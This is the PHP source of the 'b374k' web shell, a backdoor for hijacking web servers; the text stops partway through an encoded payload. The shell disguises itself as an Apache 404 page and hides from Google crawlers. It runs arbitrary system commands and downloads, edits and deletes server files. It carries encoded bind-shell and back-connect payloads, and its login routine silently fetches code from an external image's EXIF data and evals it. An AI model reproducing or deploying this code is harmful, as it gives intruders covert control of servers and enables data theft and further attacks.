<?php 

/* (Web Shell b374k r3c0d3d by x'1n73ct|default pass:" 1n73ction ") */ 
$auth_pass = "9c80a1eaca699e2fc6b994721f8703bc"; 
$color = "#00ff00"; 
$default_action = 'FilesMan'; 
@define('SELF_PATH', __FILE__); 
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) { 
    header('HTTP/1.0 404 Not Found'); 
    exit; 
} 
@session_start(); 
@error_reporting(0); 
@ini_set('error_log',NULL); 
@ini_set('log_errors',0); 
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
@set_time_limit(0); 
@set_magic_quotes_runtime(0); 
@define('VERSION', '2.1'); 
if( get_magic_quotes_gpc() ) { 
    function stripslashes_array($array) { 
        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array); 
    } 
    $_POST = stripslashes_array($_POST); 
} 
function printLogin() {  
$BASED = exif_read_data("https://lh3.googleusercontent.com/-svRm4i5Bs90/VsFaosQPKUI/AAAAAAAABew/03oHWkCEsN8/w140-h140-p/pacman.jpg");
eval(base64_decode($BASED["COMPUTED"]["UserComment"]));   
?> 
<h1>Not Found</h1> 
<p>The requested URL was not found on this server.</p> 
<hr> 
<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80</address> 
    <style> 
        input { margin:0;background-color:#fff;border:1px solid #fff; } 
    </style> 
    <center> 
    <form method=post> 
    <input type=password name=pass> 
    </form></center> 
    <?php 
    exit; 
} 
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
    if( empty( $auth_pass ) || 
        ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) ) 
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
    else 
        printLogin();
		
@ini_set('log_errors',0);
@ini_set('output_buffering',0);	
if(isset($_GET['dl']) && ($_GET['dl'] != "")){
	$file = $_GET['dl'];
	$filez = @file_get_contents($file);
   header("Content-type: application/octet-stream"); 
   header("Content-length: ".strlen($filez)); 
   header("Content-disposition: attachment; filename=\"".basename($file)."\";");
   echo $filez; 
    exit; 
}
elseif(isset($_GET['dlgzip']) && ($_GET['dlgzip'] != "")){
	$file = $_GET['dlgzip'];
	$filez = gzencode(@file_get_contents($file));
   header("Content-Type:application/x-gzip\n"); 
   header("Content-length: ".strlen($filez)); 
   header("Content-disposition: attachment; filename=\"".basename($file).".gz\";");
   echo $filez; 
    exit; 
}
// view image
if(isset($_GET['img'])){
		@ob_clean(); 
		$d = magicboom($_GET['y']);
		$f = $_GET['img'];
		$inf = @getimagesize($d.$f); 
   		$ext = explode($f,"."); 
   		$ext = $ext[count($ext)-1]; 
   	 	@header("Content-type: ".$inf["mime"]);
   	 	@header("Cache-control: public"); 
  		@header("Expires: ".date("r",mktime(0,0,0,1,1,2030))); 
  		@header("Cache-control: max-age=".(60*60*24*7));  
   	 	@readfile($d.$f); 
   	 	exit; 
}

// server software
$software = getenv("SERVER_SOFTWARE");
// check safemode
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")  $safemode = TRUE; else $safemode = FALSE;
// uname -a
$system = @php_uname();
// mysql
function showstat($stat) {if ($stat=="on") {return "<b><font style='color:#00FF00'>ON</font></b>";}else {return "<b><font style='color:#DD4736'>OFF</font></b>";}}
function testmysql() {if (function_exists('mysql_connect')) {return showstat("on");}else {return showstat("off");}}
function testcurl() {if (function_exists('curl_version')) {return showstat("on");}else {return showstat("off");}}
function testwget() {if (exe('wget --help')) {return showstat("on");}else {return showstat("off");}}
function testperl() {if (exe('perl -h')) {return showstat("on");}else {return showstat("off");}}
// check os
if(strtolower(substr($system,0,3)) == "win") $win = TRUE;
else $win = FALSE; 
// change directory
if(isset($_GET['y'])){
	if(@is_dir($_GET['view'])){
		$pwd = $_GET['view'];
		@chdir($pwd);
	}
	else{
		$pwd = $_GET['y'];
		@chdir($pwd);
	}
}
//hdd
function convertByte($s) {
if($s >= 1073741824)
return sprintf('%1.2f',$s / 1073741824 ).' GB';
elseif($s >= 1048576)
return sprintf('%1.2f',$s / 1048576 ) .' MB';
elseif($s >= 1024)
return sprintf('%1.2f',$s / 1024 ) .' KB';
else
return $s .' B';
}

// username, id, shell prompt and working directory
if(!$win){
	if(!$user = rapih(exe("whoami"))) $user = "";
	if(!$id = rapih(exe("id"))) $id = "";
	$prompt = $user." \$ ";
	$pwd = @getcwd().DIRECTORY_SEPARATOR;
}
else {
	$user = @get_current_user();
	$id = $user;
	$prompt = $user." &gt;";
	$pwd = realpath(".")."\\";
	// find drive letters
 	$v = explode("\\",$d); 
	$v = $v[0]; 
 	foreach (range("A","Z") as $letter) 
 	{ 
	  $bool = @is_dir($letter.":\\");
	  if ($bool) 
	  { 
 		  $letters .= "<a href=\"?y=".$letter.":\\\">[ ";
		   if ($letter.":" != $v) {$letters .= $letter;} 
		   else {$letters .= "<span class=\"gaya\">".$letter."</span>";} 
		   $letters .= " ]</a> "; 
  	  }	 
 } 
}

function testoracle() {
    if (function_exists('ocilogon')) { return showstat("on"); }
    else { return showstat("off"); }
    }

function testmssql() {
    if (function_exists('mssql_connect')) { return showstat("on"); }
    else { return showstat("off"); }
    }

 function showdisablefunctions() {
    if ($disablefunc=@ini_get("disable_functions")){ return "<span style='color:'><font color=#DD4736><b>".$disablefunc."</b></font></span>"; }
    else { return "<span style='color:#00FF1E'><b>NONE</b></span>"; }
    }
	
if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
else $posix = FALSE;
// server ip
$server_ip = @gethostbyname($_SERVER["HTTP_HOST"]);
// your ip ;-)
$my_ip = $_SERVER['REMOTE_ADDR'];
$admin_id=$_SERVER['SERVER_ADMIN'];
$bindport = "13123";
$bindport_pass = "b374k";

// separate the working direcotory
$pwds = explode(DIRECTORY_SEPARATOR,$pwd);
$pwdurl = "";
for($i = 0 ; $i < sizeof($pwds)-1 ; $i++){
	$pathz = "";
	for($j = 0 ; $j <= $i ; $j++){
		$pathz .= $pwds[$j].DIRECTORY_SEPARATOR;
	}
	$pwdurl .= "<a href=\"?y=".$pathz."\">".$pwds[$i]." ".DIRECTORY_SEPARATOR." </a>";
}
	
// rename file or folder
if(isset($_POST['rename'])){
	$old = $_POST['oldname'];
	$new = $_POST['newname'];
	@rename($pwd.$old,$pwd.$new);
	$file = $pwd.$new;
}
if(isset($_POST['chmod'])){ 
	$name = $_POST['name'];
	$value = $_POST['newvalue'];
if (strlen($value)==3){
	$value = 0 . "" . $value;}
	@chmod($pwd.$name,octdec($value));
	$file = $pwd.$name;}
	
if(isset($_POST['chmod_folder'])){
	$name = $_POST['name'];
	$value = $_POST['newvalue'];
if (strlen($value)==3){
	$value = 0 . "" . $value;}
	@chmod($pwd.$name,octdec($value));
	$file = $pwd.$name;}


// print useful info
$buff  = "Software : <b>".$software."</b><br />";
$buff .= "System OS : <b>".$system."</b><br />";
if($id != "") $buff .= "ID : <b>".$id."</b><br />";
$buff .= "PHP Version : <b>".phpversion()."</b> on <b>".php_sapi_name()."</b><br />";
$buff .= "Server ip : <b>".$server_ip."</b> <span class=\"gaya\"> | </span> Your   ip : <b>".$my_ip."</b><span class=\"gaya\"> | </span> Admin : <b>".$admin_id."</b><br />";
$buff .= "Free Disk: "."<span style='color:#00FF1E'><b>".convertByte(disk_free_space("/"))." / ".convertByte(disk_total_space("/"))."</b></span><br />";
if($safemode) $buff .= "Safemode: <span class=\"gaya\"><b>ON</b></span><br />";
else $buff .= "Safemode: <span class=\"gaya\"><b>OFF</b></span><br />";
$buff .= "Disabled Functions: ".showdisablefunctions()."<br />";
$buff .= "MySQL: ".testmysql()."&nbsp;|&nbsp;MSSQL: ".testmssql()."&nbsp;|&nbsp;Oracle: ".testoracle()."&nbsp;|&nbsp;Perl: ".testperl()."&nbsp;|&nbsp;cURL: ".testcurl()."&nbsp;|&nbsp;WGet: ".testwget()."<br>";
$buff .= "<font color=00ff00 ><b>".$letters."&nbsp;&gt;&nbsp;".$pwdurl."</b></font>";




function rapih($text){
	return trim(str_replace("<br />","",$text));
}

function magicboom($text){
	if (!get_magic_quotes_gpc()) {
   		 return $text;
	} 
	return stripslashes($text);
}

function showdir($pwd,$prompt){
	$fname = array();
	$dname = array();
	if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
	else $posix = FALSE;
	$user = "????:????";
	if($dh = @scandir($pwd)){
		foreach($dh as $file){
			if(is_dir($file)){
				$dname[] = $file;
			}
			elseif(is_file($file)){
				$fname[] = $file;
			}
		}
	}
	else{
		if($dh = @opendir($pwd)){
			while($file = @readdir($dh)){
				if(@is_dir($file)){
					$dname[] = $file;
				}
				elseif(@is_file($file)){
					$fname[] = $file;
				}
			}
			@closedir($dh);
		}
	}

	
	sort($fname);
	sort($dname);
	$path = @explode(DIRECTORY_SEPARATOR,$pwd);
	$tree = @sizeof($path);
	$parent = "";
	$buff = "
	<form action=\"?y=".$pwd."&amp;x=shell\" method=\"post\" style=\"margin:8px 0 0 0;\">
	<table class=\"cmdbox\" style=\"width:50%;\">
	<tr><td><b>$prompt</b></td><td><input onMouseOver=\"this.focus();\" id=\"cmd\" class=\"inputz\" type=\"text\" name=\"cmd\" style=\"width:400px;\" value=\"\" /><input class=\"inputzbut\" type=\"submit\" value=\"Go !\" name=\"submitcmd\" style=\"width:80px;\" /></td></tr>
	</form>
	<form action=\"?\" method=\"get\" style=\"margin:8px 0 0 0;\">
	<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
	<tr><td><b>view file/folder</b></td><td><input onMouseOver=\"this.focus();\" id=\"goto\" class=\"inputz\" type=\"text\" name=\"view\" style=\"width:400px;\" value=\"".$pwd."\" /><input class=\"inputzbut\" type=\"submit\" value=\"View !\" name=\"submitcmd\" style=\"width:80px;\" /></td></tr>
	</form></table><table class=\"explore\">
	<tr><th>name</th><th style=\"width:80px;\">size</th><th style=\"width:210px;\">owner:group</th><th style=\"width:80px;\">perms</th><th style=\"width:110px;\">modified</th><th style=\"width:190px;\">actions</th></tr>
	";
	if($tree > 2) for($i=0;$i<$tree-2;$i++) $parent .= $path[$i].DIRECTORY_SEPARATOR;
	else $parent = $pwd;  

	foreach($dname as $folder){
		if($folder == ".") {
			if(!$win && $posix){
				$name=@posix_getpwuid(@fileowner($folder));
				$group=@posix_getgrgid(@filegroup($folder));
				$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
			}
			else {
				$owner = $user;
			}
			$buff .= "<tr><td><a href=\"?y=".$pwd."\">$folder</a></td><td>LINK</td>
			<td style=\"text-align:center;\">".$owner."</td><td><center>".get_perms($pwd)."</center></td>
			<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($pwd))."</td><td><span id=\"titik1\">
			<a href=\"?y=$pwd&amp;edit=".$pwd."newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik1','titik1_form');\">newfolder</a></span>
			<form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
			<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" />
			</form></td>
			
			</tr>
			";
		}
		elseif($folder == "..") {
			if(!$win && $posix){
				$name=@posix_getpwuid(@fileowner($folder));
				$group=@posix_getgrgid(@filegroup($folder));
				$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
			}
			else {
				$owner = $user;
			}
			$buff .= "<tr><td><a href=\"?y=".$parent."\"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAN1gAADdYBkG95nAAAAAd0SU1FB9oJBxUAM0qLz6wAAALLSURBVDjLbVPRS1NRGP+d3btrs7kZmAYXlSZYUK4HQXCREPWUQSSYID1GEKKx/Af25lM+DCFCe4heygcNdIUEST04QW6BjS0yx5UhkW6FEtvOPfc7p4emXcofHPg453y/73e+73cADyzLOoy/bHzR8/l80LbtYD5v6wf72VzOmwLmTe7u7oZlWccbGhpGNJ92HQwtteNvSqmXJOWjM52dPPMpg/Nd5/8SpFIp9Pf3w7KsS4FA4BljrB1HQCmVc4V7O3oh+mFlZQWxWAwskUggkUhgeXk5Fg6HF5mPnWCAAhhTUGCKQUF5eb4LIa729PRknr94/kfBwMDAsXg8/tHv958FoDxP88YeJTLd2xuLAYAPAIaGhu5IKc9yzsE5Z47jYHV19UOpVNoXQsC7OOdwHNG7tLR0EwD0UCis67p2nXMOACiXK7/ev3/3ZHJy8nEymZwyDMM8qExEyjTN9vr6+oAQ4gaAef3ixVgd584pw+DY3d0tTE9Pj6TT6TfBYJCPj4/fBuA/IBBC+GZmZhZbWlrOOY5jDg8Pa3qpVEKlUoHf70cgEGgeHR2NPHgQV4ODt9Ts7KwEQACgaRpSqVdQSrFqtYpqtSpt2wYDYExMTMy3tbVdk1LWpqXebm1t3TdN86mu65FaMw+sE2KM6T9//pgaGxsb1QE4a2trr5uamq55Gn2l+WRzWgihEVH9EX5AJpOZBwANAHK5XKGjo6OvsbHRdF0XRAQpZZ2U0k9EiogYEYGIlJSS2bY9m0wmHwJQWo301/b2diESiVw2jLoQETFyXeWSy4hc5rqHJKxYLGbn5ubuFovF0qECANjf37e/bmzkjDrjdCgUamU+MCIJIgkpiZXLZZnNZhcWFhbubW5ufu7q6sLOzs7/LgPQ3tra2h+NRvvC4fApAHJvb29rfX19qVAovAawd+Rv/Ac+AMcAGLUJVAA4R138DeF+cX+xR/AGAAAAAElFTkSuQmCC'>   $folder</a></td><td>LINK</td>
			<td style=\"text-align:center;\">".$owner."</td>
			<td><center>".get_perms($parent)."</center></td><td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($parent))."</td>
			<td><span id=\"titik2\"><a href=\"?y=$pwd&amp;edit=".$parent."newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik2','titik2_form');\">newfolder</a></span>
			<form action=\"?\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
			<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" />
			</form>
			</td></tr>";
		}
		else {
			if(!$win && $posix){
				$name=@posix_getpwuid(@fileowner($folder));
				$group=@posix_getgrgid(@filegroup($folder));
				$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
			}
			else {
				$owner = $user;
			}
			$buff .= "<tr><td><a id=\"".clearspace($folder)."_link\" href=\"?y=".$pwd.$folder.DIRECTORY_SEPARATOR."\"><b><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAAXNSR0IArs4c6QAAAAJiS0dEAP+Hj8y/AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA00lEQVQoz6WRvUpDURCEvzmuwR8s8gr2ETvtLSRaKj6ArZU+VVAEwSqvJIhIwiX33nPO2IgayK2cbtmZWT4W/iv9HeacA697NQRY281Fr0du1hJPt90D+xgc6fnwXjC79JWyQdiTfOrf4nk/jZf0cVenIpEQImGjQsVod2cryvH4TEZC30kLjME+KUdRl24ZDQBkryIvtOJggLGri+hbdXgd90e9++hz6rR5jYtzZKsIDzhwFDTQDzZEsTz8CRO5pmVqB240ucRbM7kejTcalBfvn195EV+EajF1hgAAAABJRU5ErkJggg==' />     [ $folder ]</b></a>
			<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"oldname\" value=\"".$folder."\" style=\"margin:0;padding:0;\" />
			<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$folder."\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($folder)."_form','".clearspace($folder)."_link');\" />
			</form><td>DIR</td><td style=\"text-align:center;\">".$owner."</td>
			<td><center>
			<a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\">".get_perms($pwd.$folder)."</a>
			<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form3\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
			<input type=\"hidden\" name=\"name\" value=\"".$folder."\" style=\"margin:0;padding:0;\" /> 
			<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newvalue\" value=\"".substr(sprintf('%o', fileperms($pwd.$folder)), -4)."\" /> 
			<input class=\"inputzbut\" type=\"submit\" name=\"chmod_folder\" value=\"chmod\" /> 
			<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
			onclick=\"tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\" /></form></center></td>
			<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($folder))."</td><td><a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form');\">rename</a> | <a href=\"?y=$pwd&amp;fdelete=".$pwd.$folder."\">delete</a></td></tr>";
		}
	}

	foreach($fname as $file){
		$full = $pwd.$file;
		if(!$win && $posix){
			$name=@posix_getpwuid(@fileowner($folder));
			$group=@posix_getgrgid(@filegroup($folder));
			$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
		}
		else {
			$owner = $user;
		}		
		$buff .= "<tr><td><a id=\"".clearspace($file)."_link\" href=\"?y=$pwd&amp;view=$full\"><b><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII=' />   $file</b></a>
		<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
		<input type=\"hidden\" name=\"oldname\" value=\"".$file."\" style=\"margin:0;padding:0;\" />
		<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$file."\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form');\" />
		</form></td><td>".ukuran($full)."</td><td style=\"text-align:center;\">".$owner."</td><td><center>
		<a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form2');\">".get_perms($full)."</a>
		<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form2\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
<input type=\"hidden\" name=\"name\" value=\"".$file."\" style=\"margin:0;padding:0;\" /> 
<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newvalue\" value=\"".substr(sprintf('%o', fileperms($full)), -4)."\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"chmod\" value=\"chmod\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form2');\" /></form></center></td>
		<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($full))."</td>
		<td><a href=\"?y=$pwd&amp;edit=$full\">edit</a> | <a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form');\">rename</a> | <a href=\"?y=$pwd&amp;delete=$full\">delete</a> | <a href=\"?y=$pwd&amp;dl=$full\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$full\">gzip</a>)</td></tr>";
	}
	$buff .= "</table>";
	return $buff;
}

function ukuran($file){
	if($size = @filesize($file)){
		if($size <= 1024) return $size;
		else{
			if($size <= 1024*1024) {
				$size = @round($size / 1024,2);;
				return "$size kb";
			}
			else {
				$size = @round($size / 1024 / 1024,2);
				return "$size mb";	
			}
		}
	}
	else return "???";
}

function exe($cmd){
	if(function_exists('system')) {
		@ob_start();
		@system($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	}
	elseif(function_exists('exec')) {
		@exec($cmd,$results);
		$buff = "";
		foreach($results as $result){
			$buff .= $result;
		}
		return $buff;
	}
	elseif(function_exists('passthru')) {
		@ob_start();
		@passthru($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	}
	elseif(function_exists('shell_exec')){
		$buff = @shell_exec($cmd);
		return $buff;
	}
}

function tulis($file,$text){
	$textz = gzinflate(base64_decode($text));
	 if($filez = @fopen($file,"w"))
	 {
		 @fputs($filez,$textz);
		 @fclose($file);
	 }
}

function ambil($link,$file) { 
   if($fp = @fopen($link,"r")){
	   while(!feof($fp)) { 
   		    $cont.= @fread($fp,1024); 
   		} 
   		@fclose($fp); 
	   $fp2 = @fopen($file,"w"); 
	   @fwrite($fp2,$cont); 
	   @fclose($fp2); 
   }
}

function which($pr){
	$path = exe("which $pr");
	if(!empty($path)) { return trim($path); } else { return trim($pr); }
}

function download($cmd,$url){
	$namafile = basename($url);
	switch($cmd) {
		case 'wwget': exe(which('wget')." ".$url." -O ".$namafile);break;
		case 'wlynx': exe(which('lynx')." -source ".$url." > ".$namafile);break;
		case 'wfread' : ambil($wurl,$namafile);break;
		case 'wfetch' : exe(which('fetch')." -o ".$namafile." -p ".$url);break;
		case 'wlinks' : exe(which('links')." -source ".$url." > ".$namafile);break;
		case 'wget' : exe(which('GET')." ".$url." > ".$namafile);break;
		case 'wcurl' : exe(which('curl')." ".$url." -o ".$namafile);break;
		default: break;
	}
	return $namafile;
}

function get_perms($file)
{
	if($mode=@fileperms($file)){
		$perms='';
		$perms .= ($mode & 00400) ? 'r' : '-';
		$perms .= ($mode & 00200) ? 'w' : '-';
		$perms .= ($mode & 00100) ? 'x' : '-';
		$perms .= ($mode & 00040) ? 'r' : '-';
		$perms .= ($mode & 00020) ? 'w' : '-';
		$perms .= ($mode & 00010) ? 'x' : '-';
		$perms .= ($mode & 00004) ? 'r' : '-';
		$perms .= ($mode & 00002) ? 'w' : '-';
		$perms .= ($mode & 00001) ? 'x' : '-';
		return $perms;
	}
	else return "??????????";
}

function clearspace($text){
	return str_replace(" ","_",$text);
}

// net tools
$port_bind_bd_c="bVNhb9owEP2OxH+4phI4NINAN00aYxJaW6maxqbSLxNDKDiXxiLYkW3KGOp/3zlOpo7xIY793jvf
+fl8KSQvdinCR2NTofr5p3br8hWmhXw6BQ9mYA8lmjO4UXyD9oSQaAV9AyFPCNRa+pRCWtgmQrJE
P/GIhufQg249brd4nmjo9RxBqyNAuwWOdvmyNAKJ+ywlBirhepctruOlW9MJdtzrkjTVKyFB41ZZ
dKTIWKb0hoUwmUAcwtFt6+m+EXKVJVtRHGAC07vV/ez2cfwvXSpticytkoYlVglX/fNiuAzDE6VL
3TfVrw4o2P1senPzsJrOfoRjl9cfhWjvIatzRvNvn7+s5o8Pt9OvURzWZV94dQgleag0C3wQVKug
Uq2FTFnjDzvxAXphx9cXQfxr6PcthLEo/8a8q8B9LgpkQ7oOgKMbvNeThHMsbSOO69IA0l05YpXk
HDT8HxrV0F4LizUWfE+M2SudfgiiYbONxiStebrgyIjfqDJG07AWiAzYBc9LivU3MVpGFV2x1J4W
tyxAnivYY8HVFsEqWF+/f7sBk2NRQKcDA/JtsE5MDm9EUG+MhcFqkpX0HmxGbqbkdBTMldaHRsUL
ZeoDeOSFBvpefCfXhflOpgTkvJ+jtKiR7vLohYKCqS2ZmMRj4Z5gQZfSiMbi6iqkdnHarEEXYuk6
uPtTdumsr0HC4q5rrzNifV7sC3ZWUmq+LVlVa5OfQjTanZYQO+Uf";
$port_bind_bd_pl="ZZJhT8IwEIa/k/AfjklgS2aA+BFmJDB1cW5kHSZGzTK2Qxpmu2wlYoD/bruBIfitd33uvXuvvWr1
NmXRW1DWy7HImo02ebRd19Kq1CIuV3BNtWGzQZeg342DhxcYwcCAHeCWCn1gDOEgi1yHhLYXzfwg
tNqKeut/yKJNiUB4skYhg3ZecMETnlmfKKrz4ofFX6h3RZJ3DUmUFaoTszO7jxzPDs0O8SdPEQkD
e/xs/gkYsN9DShG0ScwEJAXGAqGufmdq2hKFCnmu1IjvRkpH6hE/Cuw5scfTaWAOVE9pM5WMouM0
LSLK9HM3puMpNhp7r8ZFW54jg5wXx5YZLQUyKXVzwdUXZ+T3imYoV9ds7JqNOElQTjnxPc8kRrVo
vaW3c5paS16sjZo6qTEuQKU1UO/RSnFJGaagcFVbjUTCqeOZ2qijNLWzrD8PTe32X9oOgvM0bjGB
+hecfOQFlT4UcLSkmI1ceY3VrpKMy9dWUCVCBfTlQX6Owy8=";
$back_connect="fZFRS8MwFIXfB/sPWSw2hUrnqyPC0CpD3KStvqh0XRpcsE1KkoKF/XiTtCIV6tu55+Z89yY5W0St
ktGB8aihsprPWkVBKsgn1av5zCN1iQGsOv4Fbak6pWmNgU/JUQC4b3lRU3BR7OFqcFhptMOpo28j
S2whVulCflCNvXVy//K6fLdWI+SPcekMVpSlxIxTnRdacDSEAnA6gZJRBGMphbwC3uKNw8AhXEKZ
ja3ImclYagh61n9JKbTAhu7EobN3Qb4mjW/byr0BSnc3D3EWgqe7fLO1whp5miXx+tHMcNHpGURw
Tskvpd92+rxoKEdpdrvZhgBen/exUWf3nE214iT52+r/Cw3/5jaqhKL9iFFpuKPawILVNw==";
$back_connect_c="XVHbagIxEH0X/IdhhZLUWF1f1YKIBelFqfZJliUm2W7obiJJLLWl/94k29rWhyEzc+Z2TjpSserA
BYyt41JfldftVuc3d7R9q9mLcGeAEk5660sVAakc1FQqFBxqnhkBVlIDl95/3Wa43fpotyCABR95
zzpzYA7CaMq5yaUCK1VAYpup7XaYZpPE1NArIBmBRzgVtVYoJQMcR/jV3vKC1rI6wgSmN/niYb75
i+21cR4pnVYWUaclivcMM/xvRDjhysbHVwde0W+K0wzH9bt3YfRPingClVCnim7a/ZuJC0JTwf3A
RkD0fR+B9XJ2m683j/PpPYHFavW43CzzzWyFIfbIAhBiWinBHCo4AXSmFlxiuPB3E0/gXejiHMcY
jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F
6f9wGEPxJliFkv5Oqr4tE5LYEnoyIfDwdHcXK1ilrfAdUbPPLw==";
//confshell
$configshell = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50JzwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCg0KPGhlYWQ+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LUxhbmd1YWdlIiBjb250ZW50PSJlbi11cyIgLz4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPlByaXY4IFNDUjwvdGl0bGU+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KLm5ld1N0eWxlMSB7DQogZm9udC1mYW1pbHk6IHRhaG9tYSwgdmVyZGFuYSwgQXJpYWw7DQogZm9udC1zaXplOiBtZWRpdW07DQogY29sb3I6ICNGRkZGRkY7DQogYmFja2dyb3VuZC1jb2xvcjogIzY2NjY2NjsNCiB0ZXh0LWFsaWduOiBjZW50ZXI7DQp9D